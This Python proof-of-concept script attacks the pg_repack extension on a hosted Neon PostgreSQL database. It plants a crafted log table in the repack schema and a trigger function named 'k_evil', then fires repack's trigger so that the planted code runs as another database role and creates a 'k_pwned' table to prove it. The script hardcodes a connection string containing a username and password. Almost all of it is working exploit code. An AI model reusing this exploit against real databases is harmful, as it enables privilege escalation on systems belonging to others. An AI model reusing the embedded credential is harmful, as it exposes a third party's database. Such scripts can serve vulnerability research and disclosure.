# -*- coding: utf-8 -*-
"""pg_repack PoC v2:全错误可见,分步执行"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        if fetch:
            return cur.fetchall()
        return 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:300]

print('create ext:', q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False))
print('tables:', q("SELECT tablename FROM pg_tables WHERE schemaname='public'"))
print('create k_src:', q("CREATE TABLE k_src(id int, v text)", fetch=False))
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
print('oid:', oid)
print('create type:', q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False))
print('create log:', q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False))
print('create k_evil:', q("""CREATE FUNCTION k_evil() RETURNS trigger LANGUAGE plpgsql AS $q$
BEGIN EXECUTE 'CREATE TABLE k_pwned AS SELECT current_user u'; RETURN NEW; END $q$""", fetch=False))
print('t1:', q("CREATE TRIGGER t1 AFTER INSERT ON repack.log_%d FOR EACH ROW EXECUTE FUNCTION k_evil()" % oid, fetch=False))
print('t2:', q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False))
print('insert:', q("INSERT INTO k_src VALUES (1,'x')", fetch=False))
print('k_pwned owner:', q("SELECT tableowner FROM pg_tables WHERE tablename='k_pwned'"))
print('k_pwned rows:', q("SELECT * FROM k_pwned"))
conn.close()
